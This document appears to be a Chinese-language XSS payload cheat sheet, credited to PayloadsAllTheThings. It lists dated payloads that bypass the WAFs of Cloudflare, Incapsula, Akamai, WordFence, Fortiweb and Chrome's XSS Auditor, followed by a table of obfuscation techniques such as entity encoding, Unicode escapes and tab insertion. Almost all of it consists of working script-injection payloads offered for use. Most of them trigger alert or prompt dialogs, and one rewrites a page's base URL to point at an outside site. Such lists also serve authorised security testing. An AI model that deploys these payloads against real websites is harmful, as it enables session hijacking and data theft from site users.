# XSS WAF Bypass - XSS WAF绕过技术

[SEARCH_KEYWORDS]
漏洞类型: XSS Cross-Site Scripting WAF Bypass 跨站脚本 WAF绕过
攻击类型: Filter Bypass WAF Evasion Cross-Site Scripting
关键词: XSS WAF bypass filter evasion Cloudflare Incapsula Akamai WordFence Fortiweb
技术: Encoding Bypass Case Manipulation HTML Entity Null Byte Tag Obfuscation
WAF: Cloudflare Chrome Auditor Incapsula Akamai WordFence Fortiweb

[CONTENT]

## XSS WAF绕过概述

WAF(Web应用防火墙)设计用于通过检查进出流量中的攻击模式来过滤恶意内容。尽管功能强大，WAF往往难以跟上攻击者使用的各种混淆和修改载荷的方法。

## Cloudflare绕过

### 2021年1月

```js
<svg/onrandom=random onload=confirm(1)>
<video onnull=null onmouseover=confirm(1)>
```

### 2020年4月

```js
<svg/OnLoad="`${prompt``}`">
```

### 2019年8月

```js
<svg/onload=%26nbsp;alert`bohdan`+
```

### 2019年6月

```js
1'"><img/src/onerror=.1|alert``>
```

### 2019年6月

```js
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
```

### 2019年3月

```js
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
```

### 2018年2月

```html
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
```

## Chrome Auditor绕过

注意: Chrome Auditor在最新版Chrome和Chromium浏览器中已弃用和移除。

### 2018年8月

```javascript
</script><svg><script>alert(1)-%26apos%3B
```

## Incapsula WAF绕过

### 2019年5月

```js
<svg onload\r\n=$.globalEval("al"+"ert()");>
```

### 2018年3月

```javascript
anythinglr00</script><script>alert(document.domain)</script>uxldz
anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
```

### 2018年9月

```javascript
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
```

## Akamai WAF绕过

### 2018年6月

```javascript
?"></script><base%20c%3D=href%3Dhttps:\mysite>
```

### 2018年10月

```svg
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
```

## WordFence WAF绕过

### 2018年9月

```html
<a href=javas&#99;ript:alert(1)>
```

## Fortiweb WAF绕过

### 2019年7月

```javascript
\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
```

## 绕过技术总结

| 技术 | 示例 |
|------|------|
| 大小写混淆 | `<ScRiPt>alert(1)</sCrIpT>` |
| HTML实体编码 | `&#97;&#108;&#101;&#114;&#116;` |
| Unicode编码 | `\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e` |
| Tab/换行符 | `j&Tab;a&Tab;v&Tab;asc&NewLine;ript` |
| 空字节 | `%00` |
| 双重编码 | `%253cscript%253e` |
| 事件处理器混淆 | `onrandom=random onload` |
| 模板字符串 | `` `alert`` `` |

## 参考文档

原始来源: PayloadsAllTheThings/XSS Injection/3 - XSS Common WAF Bypass.md